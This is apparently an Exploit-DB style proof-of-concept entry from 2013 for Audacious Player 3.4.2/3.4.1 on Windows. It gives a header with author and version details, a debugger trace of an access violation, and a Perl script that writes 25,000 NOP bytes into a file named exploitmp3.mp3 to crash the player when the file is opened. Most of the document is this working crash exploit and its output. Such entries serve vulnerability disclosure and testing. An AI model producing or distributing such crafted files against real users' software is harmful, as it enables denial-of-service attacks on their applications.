# Exploit Title: Audacious Player 3.4.2/3.4.1 (Windows) (.mp3) - Crash POC
# Date: 26.11.2013
# Exploit Author: Akin Tosunlar
# Software Link[3.4.2]: http://distfiles.audacious-media-player.org/audacious-3.4.2-win32.zip
# Software Link[3.4.1]: http://www.softpedia.com/dyn-postdownload.php?p=208954&t=0&i=1
# Version: 3.4.2/3.4.1 (Probably old version of software and the LATEST version too)
# Vendor Homepage: http://audacious-media-player.org
# Tested on: [ Windows 7 64Bit]
#============================================================================================
# After creating POC file (.mp3), Add File To Program
#============================================================================================
# Contact :
#------------------
# Web Page : http://www.vigasis.com
#============================================================================================

#(15bc.117c): Access violation - code c0000005 (first chance)
#First chance exceptions are reported before any exception handling.
#This exception may be expected and handled.
#eax=0c68fe30 ebx=004229d4 ecx=00000001 edx=00000000 esi=0028ff34 edi=760b2940
#eip=6b04127b esp=0028fca0 ebp=0028fd88 iopl=0         nv up ei pl nz na pe nc
#cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206

my $file= "exploitmp3.mp3";

my $junk= "\x90" x 25000;

open($FILE,">$file");
print $FILE $junk;
close($FILE);
print "mp3 File Created successfully\n";